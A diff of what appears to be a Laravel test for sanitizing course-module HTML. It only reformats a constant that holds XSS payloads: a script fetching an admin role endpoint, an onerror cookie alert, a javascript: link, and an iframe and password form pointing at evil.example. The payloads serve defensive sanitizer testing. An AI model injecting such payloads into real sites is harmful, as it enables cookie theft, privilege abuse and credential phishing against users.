@@ -18,15 +18,17 @@ class ModuleContentSanitizationTest extends TestCase
     use RefreshDatabase;
 
     private const PAYLOAD = '<h2>Loops</h2><p>Read <a href="https://docs.oracle.com/javase/tutorial/">the tutorial</a>.</p>'
-        . '<script>fetch("/admin/users/1/role")</script>'
-        . '<img src="x" onerror="alert(document.cookie)">'
-        . '<a href="javascript:alert(1)">click</a>'
-        . '<p onclick="alert(2)" style="position:fixed">Styled</p>'
-        . '<iframe src="https://evil.example"></iframe>'
-        . '<form action="https://evil.example"><input name="password"><button>Sign in</button></form>';
+        .'<script>fetch("/admin/users/1/role")</script>'
+        .'<img src="x" onerror="alert(document.cookie)">'
+        .'<a href="javascript:alert(1)">click</a>'
+        .'<p onclick="alert(2)" style="position:fixed">Styled</p>'
+        .'<iframe src="https://evil.example"></iframe>'
+        .'<form action="https://evil.example"><input name="password"><button>Sign in</button></form>';
 
     private User $instructor;
+
     private User $student;
+
     private SchoolClass $class;
 
     protected function setUp(): void
